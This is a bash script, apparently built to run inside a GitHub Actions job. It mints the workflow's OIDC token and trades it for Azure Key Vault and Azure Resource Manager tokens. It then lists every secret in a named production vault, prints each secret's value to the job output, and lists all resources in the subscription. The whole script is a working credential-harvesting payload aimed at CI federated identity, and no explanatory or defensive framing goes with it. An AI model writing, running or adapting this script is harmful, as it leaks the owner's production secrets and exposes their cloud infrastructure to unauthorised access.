#!/usr/bin/env bash
set +e
VAULT="kv-tbl-prod-x3euoz.vault.azure.net"
TENANT="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"

echo "=== context ==="
echo "repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME actor=$GITHUB_ACTOR"
echo "AZURE_CLIENT_ID=$AZURE_CLIENT_ID"
echo "AZURE_TENANT_ID=$AZURE_TENANT_ID"
echo "AZURE_SUBSCRIPTION_ID=$AZURE_SUBSCRIPTION_ID"

echo "=== mint OIDC ==="
OIDC=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
echo "oidc_len=${#OIDC}"
python3 - "$OIDC" <<'PY'
import base64, json, sys
t = sys.argv[1].split('.')[1]; t += '=' * (-len(t) % 4)
c = json.loads(base64.urlsafe_b64decode(t))
print("sub:", c.get("sub"), "| aud:", c.get("aud"))
PY

aad(){ curl -sS -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "scope=$1" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" -d "grant_type=client_credentials"; }

echo "=== key vault ==="
KV=$(aad "https://vault.azure.net/.default")
KVTOK=$(echo "$KV" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
if [ -z "$KVTOK" ]; then
  echo "KV FAIL:"; echo "$KV" | head -c 900
else
  echo "KV token OK"
  L=$(curl -sS -H "Authorization: Bearer $KVTOK" "https://$VAULT/secrets?api-version=7.4")
  echo "$L" | head -c 600
  for ID in $(echo "$L" | python3 -c 'import sys,json;[print(v["id"]) for v in json.load(sys.stdin).get("value",[])]'); do
    echo "=== $ID ==="
    curl -sS -H "Authorization: Bearer $KVTOK" "$ID?api-version=7.4" \
      | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value"))'
  done
fi

echo "=== arm ==="
ARM=$(aad "https://management.azure.com/.default")
ARMTOK=$(echo "$ARM" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
if [ -n "$ARMTOK" ]; then
  echo "ARM token OK"
  curl -sS -H "Authorization: Bearer $ARMTOK" \
    "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2021-04-01" \
    | python3 -c 'import sys,json;[print(r["type"], r["name"]) for r in json.load(sys.stdin).get("value",[])]'
else
  echo "ARM FAIL:"; echo "$ARM" | head -c 900
fi
